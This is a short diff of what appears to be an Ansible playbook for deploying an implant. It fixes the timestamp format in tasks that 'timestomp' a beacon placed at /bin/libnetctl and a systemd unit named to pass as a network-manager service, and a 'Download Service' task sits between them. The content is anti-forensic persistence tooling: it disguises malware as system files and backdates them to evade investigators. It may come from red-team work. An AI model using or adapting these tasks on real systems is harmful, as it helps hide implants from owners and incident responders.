@@ -7,8 +7,8 @@
 - name: Timestomp beacon
   ansible.builtin.file:
     path: /bin/libnetctl
-    modification_time: '2023-01-01 12:34:51'
-    access_time: '2023-01-01 12:34:51'
+    modification_time: '202301011234.51'
+    access_time: '202301011234.51'
 
 - name: Download Service
   ansible.builtin.copy:
@@ -19,8 +19,8 @@
 - name: Timestomp service 
   ansible.builtin.file:
     path: /lib/systemd/system/systemd-network-manager.service
-    modification_time: '2023-01-01 12:34:51'
-    access_time: '2023-01-01 12:34:51'
+    modification_time: '202301011234.51'
+    access_time: '202301011234.51'
 
 # - name: Ensure pip is installed
 #   ansible.builtin.package:
